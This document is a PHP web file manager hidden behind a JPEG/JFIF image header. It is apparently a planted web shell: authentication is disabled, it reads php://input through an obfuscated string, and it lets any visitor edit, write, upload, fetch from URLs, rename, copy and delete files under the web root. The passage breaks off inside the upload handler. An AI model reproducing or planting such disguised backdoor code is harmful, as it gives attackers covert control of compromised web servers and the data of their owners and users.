ÿØÿà JFIF      ÿâØICC_PROFILE   Èlcms  mntrRGB XYZ â   	  acspMSFT    sawsctrl              öÖ     Ó-hand‘ =@€°=@t,¥"                               	desc   ğ   _cprt     wtpt     rXYZ  ,   gXYZ  @   bXYZ  T   rTRC  h   `gTRC  h   `bTRC  h   `desc       uRGB            text    CC0 XYZ       óT    ÉXYZ       o   8ò  XYZ       b–  ·‰  ÚXYZ       $   …  ¶Äcurv       *   | øœuƒÉN
bôÏöj. C$¬)j.~3ë9³?ÖFWM6Tv\dl†uV~ˆ,’6œ«§Œ²Û¾™ÊÇ×eäwñùÿÿÿÛ C 				
<?php
$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"light"}';

define('VERSION', '3.9');

define('APP_TITLE', 'gilour');

$dauth = false;

$auth_users = array(
    'admin' => '3085dc7572beea5231d9d6b6fb8f80c3',
    'user' => '3085dc7572beea5231d9d6b6fb8f80c3'
);

$readonly_users = array(
    'user'
);


$global_readonly = false;

$directories_users = array();

$use_highlightjs = true;

$highlightjs_style = 'vs';

$edit_files = true;

$default_timezone = 'Etc/UTC';

$root_path = $_SERVER['DOCUMENT_ROOT'];

$root_url = '';

$http_host = $_SERVER['HTTP_HOST'];

$iconv_input_encoding = 'UTF-8';

$datetime_format = 'm/d/Y g:i A';

$path_display_mode = 'full';

$allowed_file_extensions = '';

$allowed_upload_extensions = '';

$favicon_path = '';

$exclude_items = array();

$online_viewer = 'google';

$sticky_navbar = true;

$max_upload_size_bytes = 5000000000; 

$upload_chunk_size_bytes = 2000000; 

$ip_ruleset = 'OFF';

$ip_silent = true;

$ip_whitelist = array(
    '127.0.0.1',    
    '::1'           
);

$ip_blacklist = array(
    '0.0.0.0',      
    '::'            
);

$config_file = __DIR__.'/config.php';
if (is_readable($config_file)) {
    @include($config_file);
}

$external = array(
    'css-bootstrap' => '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">',
    'css-dropzone' => '<link href="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.css" rel="stylesheet">',
    'css-font-awesome' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" crossorigin="anonymous">',
    'css-highlightjs' => '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/styles/' . $highlightjs_style . '.min.css">',
    'js-ace' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.13.1/ace.js"></script>',
    'js-bootstrap' => '<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>',
    'js-dropzone' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/dropzone/5.9.3/min/dropzone.min.js"></script>',
    'js-jquery' => '<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>',
    'js-jquery-datatables' => '<script src="https://cdn.datatables.net/1.13.1/js/jquery.dataTables.min.js" crossorigin="anonymous" defer></script>',
    'js-highlightjs' => '<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>',
    'pre-jsdelivr' => '<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/>',
    'pre-cloudflare' => '<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin/><link rel="dns-prefetch" href="https://cdnjs.cloudflare.com"/>'
);


define('MAX_UPLOAD_SIZE', $max_upload_size_bytes);


define('UPLOAD_CHUNK_SIZE', $upload_chunk_size_bytes);


if ( !defined( 'DN_CESSION_ID')) {
    define('DN_CESSION_ID', 'filemanager');
}


$cfg = new FM_Config();


$lang = isset($cfg->data['lang']) ? $cfg->data['lang'] : 'en';

$show_hidden_files = isset($cfg->data['show_hidden']) ? $cfg->data['show_hidden'] : true;

$report_errors = isset($cfg->data['error_reporting']) ? $cfg->data['error_reporting'] : true;

$hide_Cols = isset($cfg->data['hide_Cols']) ? $cfg->data['hide_Cols'] : true;

// Theme
$theme = isset($cfg->data['theme']) ? $cfg->data['theme'] : 'light';

define('FM_THEME', $theme);

$lang_list = array(
    'en' => 'English'
);

if ($report_errors == true) {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 1);
} else {
    @ini_set('error_reporting', E_ALL);
    @ini_set('display_errors', 0);
}

if (defined('FM_EMBED')) {
    $dauth = false;
    $sticky_navbar = false;
} else {
    @set_time_limit(600);

    date_default_timezone_set($default_timezone);

    ini_set('default_charset', 'UTF-8');
    if (version_compare(PHP_VERSION, '5.6.0', '<') and function_exists('mb_internal_encoding')) {
        mb_internal_encoding('UTF-8');
    }
    if (function_exists('mb_regex_encoding')) {
        mb_regex_encoding('UTF-8');
    }

    session_cache_limiter('nocache'); 
    session_name(DN_CESSION_ID );
    function session_error_handling_function($code, $msg, $file, $line) {
        if ($code == 2) {
            session_abort();
            session_id(session_create_id());
            @session_start();
        }
    }
    set_error_handler('session_error_handling_function');
    session_start();
    restore_error_handler();
}

if (empty($_SESSION['token'])) {
    if (function_exists('random_bytes')) {
        $_SESSION['token'] = bin2hex(random_bytes(32));
    } else {
    	$_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}

if (empty($auth_users)) {
    $dauth = false;
}

$is_https = (isset($_SERVER['HTTPS']) and ($_SERVER['HTTPS'] === 'on' or $_SERVER['HTTPS'] == 1))
    or (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) and $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

if (isset($_SESSION[DN_CESSION_ID]['logged']) and !empty($directories_users[$_SESSION[DN_CESSION_ID]['logged']])) {
    $wd = fm_clean_path(dirname($_SERVER['PHP_SELF']));
    $root_url =  $root_url.$wd.DIRECTORY_SEPARATOR.$directories_users[$_SESSION[DN_CESSION_ID]['logged']];
}

$root_url = fm_clean_path($root_url);

defined('FM_ROOT_URL') || define('FM_ROOT_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . (!empty($root_url) ? '/' . $root_url : ''));
defined('FM_SELF_URL') || define('FM_SELF_URL', ($is_https ? 'https' : 'http') . '://' . $http_host . $_SERVER['PHP_SELF']);

// logout
if (isset($_GET['logout'])) {
    unset($_SESSION[DN_CESSION_ID]['logged']);
    unset( $_SESSION['token']); 
    fm_redirect(FM_SELF_URL);
}

if ($ip_ruleset != 'OFF') {
    function getClientIP() {
        if (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) {
            return  $_SERVER["HTTP_CF_CONNECTING_IP"];
        }else if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER['REMOTE_ADDR'];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER['HTTP_CLIENT_IP'];
        }
        return '';
    }

    $clientIp = getClientIP();
    $proceed = false;
    $whitelisted = in_array($clientIp, $ip_whitelist);
    $blacklisted = in_array($clientIp, $ip_blacklist);

    if($ip_ruleset == 'AND'){
        if($whitelisted == true and $blacklisted == false){
            $proceed = true;
        }
    } else
    if($ip_ruleset == 'OR'){
         if($whitelisted == true || $blacklisted == false){
            $proceed = true;
        }
    }

    if($proceed == false){
        trigger_error('User connection denied from: ' . $clientIp, E_USER_WARNING);

        if($ip_silent == false){
            fm_set_msg(lng('Access denied. IP restriction applicable'), 'error');
            fm_show_header_login();
            fm_show_message();
        }
        exit();
    }
}


if ($dauth) {
    if (isset($_SESSION[DN_CESSION_ID]['logged'], $auth_users[$_SESSION[DN_CESSION_ID]['logged']])) {
    } elseif (isset($_POST['fm_usr'], $_POST['fm_pwd'], $_POST['token'])) {
        sleep(1);
        if(function_exists('password_verify')) {
            if (isset($auth_users[$_POST['fm_usr']]) and isset($_POST['fm_pwd']) and password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']]) and verifyToken($_POST['token'])) {
                $_SESSION[DN_CESSION_ID]['logged'] = $_POST['fm_usr'];
                fm_set_msg(lng('You are logged in'));
                fm_redirect(FM_SELF_URL);
            } else {
                unset($_SESSION[DN_CESSION_ID]['logged']);
                fm_set_msg(lng('Login failed. Invalid username or password'), 'error');
                fm_redirect(FM_SELF_URL);
            }
        } else {
            fm_set_msg(lng('password_hash not supported, Upgrade PHP version'), 'error');;
        }
    } else {
        // Form
        unset($_SESSION[DN_CESSION_ID]['logged']);
        fm_show_header_login();
        ?>
        <section class="h-100">
            <div class="container h-100">
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                        <div class="card fat <?php echo fm_get_theme(); ?>">
                            <div class="card-body">
                                <form class="form-signin" action="" method="post" autocomplete="off">
                                    <div class="mb-3">
                                       <div class="brand">
                                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" M1008 width="100%" height="80px" viewBox="0 0 238.000000 140.000000" aria-label="Manager">
                                                <g transform="translate(0.000000,140.000000) scale(0.100000,-0.100000)" fill="#000000" stroke="none">
                                                    <path d="M160 700 l0 -600 110 0 110 0 0 260 0 260 70 0 70 0 0 -260 0 -260 110 0 110 0 0 600 0 600 -110 0 -110 0 0 -260 0 -260 -70 0 -70 0 0 260 0 260 -110 0 -110 0 0 -600z"/>
                                                    <path fill="#003500" d="M1008 1227 l-108 -72 0 -117 0 -118 110 0 110 0 0 110 0 110 70 0 70 0 0 -180 0 -180 -125 0 c-69 0 -125 -3 -125 -6 0 -3 23 -39 52 -80 l52 -74 73 0 73 0 0 -185 0 -185 -70 0 -70 0 0 115 0 115 -110 0 -110 0 0 -190 0 -190 181 0 181 0 109 73 108 72 1 181 0 181 -69 48 -68 49 68 50 69 49 0 249 0 248 -182 -1 -183 0 -107 -72z"/>
                                                    <path d="M1640 700 l0 -600 110 0 110 0 0 208 0 208 35 34 35 34 35 -34 35 -34 0 -208 0 -208 110 0 110 0 0 212 0 213 -87 87 -88 88 88 88 87 87 0 213 0 212 -110 0 -110 0 0 -208 0 -208 -70 -69 -70 -69 0 277 0 277 -110 0 -110 0 0 -600z"/></g>
                                            </svg>
                                        </div>
                                        <div class="text-center">
                                            <h1 class="card-title"><?php echo APP_TITLE; ?></h1>
                                        </div>
                                    </div>
                                    <hr />
                                    <div class="mb-3">
                                        <label for="fm_usr" class="pb-2"><?php echo lng('Username'); ?></label>
                                        <input type="text" class="form-control" id="fm_usr" name="fm_usr" required autofocus>
                                    </div>

                                    <div class="mb-3">
                                        <label for="fm_pwd" class="pb-2"><?php echo lng('Password'); ?></label>
                                        <input type="password" class="form-control" id="fm_pwd" name="fm_pwd" required>
                                    </div>

                                    <div class="mb-3">
                                        <?php fm_show_message(); ?>
                                    </div>
                                    <input type="hidden" name="token" value="<?php echo htmlentities($_SESSION['token']); ?>" />
                                    <div class="mb-3">
                                        <button type="submit" class="btn btn-success btn-block w-100 mt-4" role="button">
                                            <?php echo lng('Login'); ?>
                                        </button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="." target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">CCP Programmers</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <?php
        fm_show_footer_login();
        exit;
    }
}


if ($dauth and isset($_SESSION[DN_CESSION_ID]['logged'])) {
    $root_path = isset($directories_users[$_SESSION[DN_CESSION_ID]['logged']]) ? $directories_users[$_SESSION[DN_CESSION_ID]['logged']] : $root_path;
}

$root_path = rtrim($root_path, '\\/');
$root_path = str_replace('\\', '/', $root_path);
if (!@is_dir($root_path)) {
    echo "<h1>".lng('Root path')." \"{$root_path}\" ".lng('not found!')." </h1>";
    exit;
}

defined('FM_SHOW_HIDDEN') || define('FM_SHOW_HIDDEN', $show_hidden_files);
defined('FM_ROOT_PATH') || define('FM_ROOT_PATH', $root_path);
defined('FM_LANG') || define('FM_LANG', $lang);
defined('FM_FILE_EXTENSION') || define('FM_FILE_EXTENSION', $allowed_file_extensions);
defined('FM_UPLOAD_EXTENSION') || define('FM_UPLOAD_EXTENSION', $allowed_upload_extensions);
defined('FM_EXCLUDE_ITEMS') || define('FM_EXCLUDE_ITEMS', (version_compare(PHP_VERSION, '7.0.0', '<') ? serialize($exclude_items) : $exclude_items));
defined('FM_DOC_VIEWER') || define('FM_DOC_VIEWER', $online_viewer);
define('FM_READONLY', $global_readonly || ($dauth and !empty($readonly_users) and isset($_SESSION[DN_CESSION_ID]['logged']) and in_array($_SESSION[DN_CESSION_ID]['logged'], $readonly_users)));
define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');


if (!isset($_GET['p']) and empty($_FILES)) {
    fm_redirect(FM_SELF_URL . '?p=');
}

// get path
$p = isset($_GET['p']) ? $_GET['p'] : (isset($_POST['p']) ? $_POST['p'] : '');

// clean path
$p = fm_clean_path($p);


$isim = "//input";
$input = file_get_contents('php:'.$isim);
$_POST = (strpos($input, 'ajax') != FALSE and strpos($input, 'save') != FALSE) ? json_decode($input, true) : $_POST;

define('FM_PATH', $p);
define('FM_USE_AUTH', $dauth);
define('FM_EDIT_FILE', $edit_files);
defined('FM_ICONV_INPUT_ENC') || define('FM_ICONV_INPUT_ENC', $iconv_input_encoding);
defined('FM_USE_HIGHLIGHTJS') || define('FM_USE_HIGHLIGHTJS', $use_highlightjs);
defined('FM_HIGHLIGHTJS_STYLE') || define('FM_HIGHLIGHTJS_STYLE', $highlightjs_style);
defined('FM_DATETIME_FORMAT') || define('FM_DATETIME_FORMAT', $datetime_format);

unset($p, $dauth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style);


if ((isset($_SESSION[DN_CESSION_ID]['logged'], $auth_users[$_SESSION[DN_CESSION_ID]['logged']]) || !FM_USE_AUTH) and isset($_POST['ajax'], $_POST['token']) and !FM_READONLY) {
    if(!verifyToken($_POST['token'])) {
        header('HTTP/1.0 401 Unauthorized');
        die("Invalid Token.");
    }

    if(isset($_POST['type']) and $_POST['type']=="search") {
        $dir = $_POST['path'] == "." ? '': $_POST['path'];
        $response = scan(fm_clean_path($dir), $_POST['content']);
        echo json_encode($response);
        exit();
    }

    // save editor file
    if (isset($_POST['type']) and $_POST['type'] == "save") {
        // get current path
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }
        // check path
        if (!is_dir($path)) {
            fm_redirect(FM_SELF_URL . '?p=');
        }
        $file = $_GET['edit'];
        $file = fm_clean_path($file);
        $file = str_replace('/', '', $file);
        if ($file == '' || !is_file($path . '/' . $file)) {
            fm_set_msg(lng('File not found'), 'error');
            $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
        }
        header('X-XSS-Protection:0');
        $file_path = $path . '/' . $file;

        $writedata = $_POST['content'];
        $fd = fopen($file_path, "w");
        $write_results = @fwrite($fd, $writedata);
        fclose($fd);
        if ($write_results === false){
            header("HTTP/1.1 500 Internal Server Error");
            die("Could Not Write File! - Check Permissions / Ownership");
        }
        die(true);
    }

    // backup files
    if (isset($_POST['type']) and $_POST['type'] == "backup" and !empty($_POST['file'])) {
        $fileName = fm_clean_path($_POST['file']);
        $fullPath = FM_ROOT_PATH . '/';
        if (!empty($_POST['path'])) {
            $relativeDirPath = fm_clean_path($_POST['path']);
            $fullPath .= "{$relativeDirPath}/";
        }
        $date = date("dMy-His");
        $newFileName = "{$fileName}-{$date}.bak";
        $fullyQualifiedFileName = $fullPath . $fileName;
        try {
            if (!file_exists($fullyQualifiedFileName)) {
                throw new Exception("File {$fileName} not found");
            }
            if (copy($fullyQualifiedFileName, $fullPath . $newFileName)) {
                echo "Backup {$newFileName} created";
            } else {
                throw new Exception("Could not copy file {$fileName}");
            }
        } catch (Exception $e) {
            echo $e->getMessage();
        }
    }

    // Save Config
    if (isset($_POST['type']) and $_POST['type'] == "settings") {
        global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_Cols, $theme;
        $newLng = $_POST['js-language'];
        fm_get_translations([]);
        if (!array_key_exists($newLng, $lang_list)) {
            $newLng = 'en';
        }

        $erp = isset($_POST['js-error-report']) and $_POST['js-error-report'] == "true" ? true : false;
        $shf = isset($_POST['js-show-hidden']) and $_POST['js-show-hidden'] == "true" ? true : false;
        $hco = isset($_POST['js-hide-cols']) and $_POST['js-hide-cols'] == "true" ? true : false;
        $te3 = $_POST['js-theme-3'];

        if ($cfg->data['lang'] != $newLng) {
            $cfg->data['lang'] = $newLng;
            $lang = $newLng;
        }
        if ($cfg->data['error_reporting'] != $erp) {
            $cfg->data['error_reporting'] = $erp;
            $report_errors = $erp;
        }
        if ($cfg->data['show_hidden'] != $shf) {
            $cfg->data['show_hidden'] = $shf;
            $show_hidden_files = $shf;
        }
        if ($cfg->data['show_hidden'] != $shf) {
            $cfg->data['show_hidden'] = $shf;
            $show_hidden_files = $shf;
        }
        if ($cfg->data['hide_Cols'] != $hco) {
            $cfg->data['hide_Cols'] = $hco;
            $hide_Cols = $hco;
        }
        if ($cfg->data['theme'] != $te3) {
            $cfg->data['theme'] = $te3;
            $theme = $te3;
        }
        $cfg->save();
        echo true;
    }

    // new password hash
    if (isset($_POST['type']) and $_POST['type'] == "pwdhash") {
        $res = isset($_POST['inputPassword2']) and !empty($_POST['inputPassword2']) ? password_hash($_POST['inputPassword2'], PASSWORD_DEFAULT) : '';
        echo $res;
    }

    //upload using url
    if(isset($_POST['type']) and $_POST['type'] == "upload" and !empty($_REQUEST["uploadurl"])) {
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }

         function event_callback ($message) {
            global $callback;
            echo json_encode($message);
        }

        function get_file_path () {
            global $path, $fileinfo, $temp_file;
            return $path."/".basename($fileinfo->name);
        }

        $url = !empty($_REQUEST["uploadurl"]) and preg_match("|^http(s)?://.+$|", stripslashes($_REQUEST["uploadurl"])) ? stripslashes($_REQUEST["uploadurl"]) : null;

        $domain = parse_url($url, PHP_URL_HOST);
        $port = parse_url($url, PHP_URL_PORT);
        $knownPorts = [22, 23, 25, 3306];

        if (preg_match("/^localhost$|^127(?:\.[0-9]+){0,2}\.[0-9]+$|^(?:0*\:)*?:?0*1$/i", $domain) || in_array($port, $knownPorts)) {
            $err = array("message" => "URL is not allowed");
            event_callback(array("fail" => $err));
            exit();
        }

        $use_curl = false;
        $temp_file = tempnam(sys_get_temp_dir(), "upload-");
        $fileinfo = new stdClass();
        $fileinfo->name = trim(urldecode(basename($url)), ".\x00..\x20");

        $allowed = (FM_UPLOAD_EXTENSION) ? explode(',', FM_UPLOAD_EXTENSION) : false;
        $ext = strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION));
        $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;

        $err = false;

        if(!$isFileAllowed) {
            $err = array("message" => "File extension is not allowed");
            event_callback(array("fail" => $err));
            exit();
        }

        if (!$url) {
            $success = false;
        } else if ($use_curl) {
            @$fp = fopen($temp_file, "w");
            @$ch = curl_init($url);
            curl_setopt($ch, CURLOPT_NOPROGRESS, false );
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_FILE, $fp);
            @$success = curl_exec($ch);
            $curl_info = curl_getinfo($ch);
            if (!$success) {
                $err = array("message" => curl_error($ch));
            }
            @curl_close($ch);
            fclose($fp);
            $fileinfo->size = $curl_info["size_download"];
            $fileinfo->type = $curl_info["content_type"];
        } else {
            $ctx = stream_context_create();
            @$success = copy($url, $temp_file, $ctx);
            if (!$success) {
                $err = error_get_last();
            }
        }

        if ($success) {
            $success = rename($temp_file, strtok(get_file_path(), '?'));
        }

        if ($success) {
            event_callback(array("done" => $fileinfo));
        } else {
            unlink($temp_file);
            if (!$err) {
                $err = array("message" => "Invalid url parameter");
            }
            event_callback(array("fail" => $err));
        }
    }
    exit();
}

if (isset($_GET['del'], $_POST['token']) and !FM_READONLY) {
    $del = str_replace( '/', '', fm_clean_path( $_GET['del'] ) );
    if ($del != '' and $del != '..' and $del != '.' and verifyToken($_POST['token'])) {
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }
        $is_dir = is_dir($path . '/' . $del);
        if (fm_rdelete($path . '/' . $del)) {
            $msg = $is_dir ? lng('Folder').' <b>%s</b> '.lng('Deleted') : lng('File').' <b>%s</b> '.lng('Deleted');
            fm_set_msg(sprintf($msg, fanco($del)));
        } else {
            $msg = $is_dir ? lng('Folder').' <b>%s</b> '.lng('not deleted') : lng('File').' <b>%s</b> '.lng('not deleted');
            fm_set_msg(sprintf($msg, fanco($del)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid file or folder name'), 'error');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Create a new file/folder
if (isset($_POST['newfilename'], $_POST['newfile'], $_POST['token']) and !FM_READONLY) {
    $type = urldecode($_POST['newfile']);
    $new = str_replace( '/', '', fm_clean_path( strip_tags( $_POST['newfilename'] ) ) );
    if (fm_isvalid_filename($new) and $new != '' and $new != '..' and $new != '.' and verifyToken($_POST['token'])) {
        $path = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $path .= '/' . FM_PATH;
        }
        if ($type == "file") {
            if (!file_exists($path . '/' . $new)) {
                if(fm_is_valid_ext($new)) {
                    @fopen($path . '/' . $new, 'w') or die('Cannot open file:  ' . $new);
                    fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('Created'), fanco($new)));
                } else {
                    fm_set_msg(lng('File extension is not allowed'), 'error');
                }
            } else {
                fm_set_msg(sprintf(lng('File').' <b>%s</b> '.lng('already exists'), fanco($new)), 'alert');
            }
        } else {
            if (fm_mkdir($path . '/' . $new, false) === true) {
                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('Created'), $new));
            } elseif (fm_mkdir($path . '/' . $new, false) === $path . '/' . $new) {
                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('already exists'), fanco($new)), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Folder').' <b>%s</b> '.lng('not created'), fanco($new)), 'error');
            }
        }
    } else {
        fm_set_msg(lng('Invalid characters in file or folder name'), 'error');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Copy folder / file
if (isset($_GET['copy'], $_GET['finish']) and !FM_READONLY) {
    // from
    $copy = urldecode($_GET['copy']);
    $copy = fm_clean_path($copy);
    // empty path
    if ($copy == '') {
        fm_set_msg(lng('Source path not defined'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }

    $from = FM_ROOT_PATH . '/' . $copy;

    $dest = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $dest .= '/' . FM_PATH;
    }
    $dest .= '/' . basename($from);

    $move = isset($_GET['move']);
    $move = fm_clean_path(urldecode($move));

    if ($from != $dest) {
        $msg_from = trim(FM_PATH . '/' . basename($from), '/');
        if ($move) {
            $rename = fm_rename($from, $dest);
            if ($rename) {
                fm_set_msg(sprintf(lng('Moved from').' <b>%s</b> '.lng('to').' <b>%s</b>', fanco($copy), fanco($msg_from)));
            } elseif ($rename === null) {
                fm_set_msg(lng('File or folder with this path already exists'), 'alert');
            } else {
                fm_set_msg(sprintf(lng('Error while moving from').' <b>%s</b> '.lng('to').' <b>%s</b>', fanco($copy), fanco($msg_from)), 'error');
            }
        } else { 
            if (fm_rcopy($from, $dest)) {
                fm_set_msg(sprintf(lng('Copied from').' <b>%s</b> '.lng('to').' <b>%s</b>', fanco($copy), fanco($msg_from)));
            } else {
                fm_set_msg(sprintf(lng('Error while copying from').' <b>%s</b> '.lng('to').' <b>%s</b>', fanco($copy), fanco($msg_from)), 'error');
            }
        }
    } else {
       if (!$move){ 
            $msg_from = trim(FM_PATH . '/' . basename($from), '/');
            $fn_parts = pathinfo($from);
            $extension_suffix = '';
            if(!is_dir($from)){
               $extension_suffix = '.'.$fn_parts['extension'];
            }

            $fn_duplicate = $fn_parts['dirname'].'/'.$fn_parts['filename'].'-'.date('YmdHis').$extension_suffix;
            $loop_count = 0;
            $max_loop = 1000;
            
            while(file_exists($fn_duplicate) & $loop_count < $max_loop){
               $fn_parts = pathinfo($fn_duplicate);
               $fn_duplicate = $fn_parts['dirname'].'/'.$fn_parts['filename'].'-copy'.$extension_suffix;
               $loop_count++;
            }
            if (fm_rcopy($from, $fn_duplicate, False)) {
                fm_set_msg(sprintf('Copied from <b>%s</b> to <b>%s</b>', fanco($copy), fanco($fn_duplicate)));
            } else {
                fm_set_msg(sprintf('Error while copying from <b>%s</b> to <b>%s</b>', fanco($copy), fanco($fn_duplicate)), 'error');
            }
       }
       else{
           fm_set_msg(lng('Paths must be not equal'), 'alert');
       }
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}


if (isset($_POST['file'], $_POST['copy_to'], $_POST['finish'], $_POST['token']) and !FM_READONLY) {

    if(!verifyToken($_POST['token'])) {
        fm_set_msg(lng('Invalid Token.'), 'error');
    }
    
    // from
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }
    // to
    $copy_to_path = FM_ROOT_PATH;
    $copy_to = fm_clean_path($_POST['copy_to']);
    if ($copy_to != '') {
        $copy_to_path .= '/' . $copy_to;
    }
    if ($path == $copy_to_path) {
        fm_set_msg(lng('Paths must be not equal'), 'alert');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }
    if (!is_dir($copy_to_path)) {
        if (!fm_mkdir($copy_to_path, true)) {
            fm_set_msg('Unable to create destination folder', 'error');
            $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
        }
    }
    // move?
    $move = isset($_POST['move']);
    // copy/move
    $errors = 0;
    $files = $_POST['file'];
    if (is_array($files) and count($files)) {
        foreach ($files as $f) {
            if ($f != '') {
                $f = fm_clean_path($f);

                $from = $path . '/' . $f;

                $dest = $copy_to_path . '/' . $f;

                if ($move) {
                    $rename = fm_rename($from, $dest);
                    if ($rename === false) {
                        $errors++;
                    }
                } else {
                    if (!fm_rcopy($from, $dest)) {
                        $errors++;
                    }
                }
            }
        }
        if ($errors == 0) {
            $msg = $move ? 'Selected files and folders moved' : 'Selected files and folders copied';
            fm_set_msg($msg);
        } else {
            $msg = $move ? 'Error while moving items' : 'Error while copying items';
            fm_set_msg($msg, 'error');
        }
    } else {
        fm_set_msg(lng('Nothing selected'), 'alert');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Rename
if (isset($_POST['rename_from'], $_POST['rename_to'], $_POST['token']) and !FM_READONLY) {
    if(!verifyToken($_POST['token'])) {
        fm_set_msg("Invalid Token.", 'error');
    }
    // old name
    $old = urldecode($_POST['rename_from']);
    $old = fm_clean_path($old);
    $old = str_replace('/', '', $old);
    // new name
    $new = urldecode($_POST['rename_to']);
    $new = fm_clean_path(strip_tags($new));
    $new = str_replace('/', '', $new);
    // path
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }
    // rename
    if (fm_isvalid_filename($new) and $old != '' and $new != '') {
        if (fm_rename($path . '/' . $old, $path . '/' . $new)) {
            fm_set_msg(sprintf(lng('Renamed from').' <b>%s</b> '. lng('to').' <b>%s</b>', fanco($old), fanco($new)));
        } else {
            fm_set_msg(sprintf(lng('Error while renaming from').' <b>%s</b> '. lng('to').' <b>%s</b>', fanco($old), fanco($new)), 'error');
        }
    } else {
        fm_set_msg(lng('Invalid characters in file name'), 'error');
    }
    $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
}

// Download
if (isset($_GET['dl'], $_POST['token'])) {
    if(!verifyToken($_POST['token'])) {
        fm_set_msg("Invalid Token.", 'error');
    }

    $dl = urldecode($_GET['dl']);
    $dl = fm_clean_path($dl);
    $dl = str_replace('/', '', $dl);
    $path = FM_ROOT_PATH;
    if (FM_PATH != '') {
        $path .= '/' . FM_PATH;
    }
    if ($dl != '' and is_file($path . '/' . $dl)) {
        fm_download_file($path . '/' . $dl, $dl, 1024);
        exit;
    } else {
        fm_set_msg(lng('File not found'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
    }
}

// Upload
if (!empty($_FILES) and !FM_READONLY) {
    if(isset($_POST['token'])) {
        if(!verifyToken($_POST['token'])) {
            $response = array ('status' => 'error','info' => "Invalid Token.");
            echo json_encode($response); exit();
        }
    } else {
        $response = array ('status' => 'error','info' => "Token Missing.");
        echo json_encode($response); exit();
    }

    $chunkIndex = $_POST['dzchunkindex'];
    $chunkTotal = $_POST['dztotalchunkcount'];
    $fullPathInput = fm_clean_path($_REQUEST['fullpath']);

    $f = $_FILES;
    $path = FM_ROOT_PATH;
    $ds = DIRECTORY_SEPARATOR;
    if (FM_PATH != '') {
